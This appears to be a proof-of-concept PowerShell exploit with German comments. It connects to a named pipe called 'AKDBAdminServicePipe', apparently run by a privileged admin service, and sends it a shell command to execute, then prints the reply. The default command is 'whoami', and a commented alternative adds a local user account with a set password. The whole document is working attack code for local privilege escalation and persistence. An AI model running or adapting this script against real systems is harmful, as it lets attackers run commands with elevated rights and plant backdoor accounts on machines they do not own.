$pipeName = "\\.\pipe\AKDBAdminServicePipe"
$bufferSize = 4096

try {
    $pipe = new-object System.IO.Pipes.NamedPipeClientStream(".", "AKDBAdminServicePipe", [System.IO.Pipes.PipeDirection]::InOut)
    $pipe.Connect(2000)  # Timeout in ms

    if ($pipe.IsConnected) {
        Write-Host "[+] Verbunden mit Named Pipe!"

        # Hier kannst du den Befehl ändern
        $command = "cmd.exe /c whoami"  # oder z.B.: "net user test123 pass123 /add"

        $writer = new-object System.IO.StreamWriter($pipe)
        $writer.AutoFlush = $true
        $writer.WriteLine($command)

        Start-Sleep -Milliseconds 500  # Zeit für Antwort

        $reader = new-object System.IO.StreamReader($pipe)
        $response = $reader.ReadToEnd()

        Write-Host "[*] Antwort von Dienst:"
        Write-Host $response
    } else {
        Write-Host "[-] Verbindung zur Pipe fehlgeschlagen."
    }

    $pipe.Close()
} catch {
    Write-Host "[-] Fehler: $_"
}
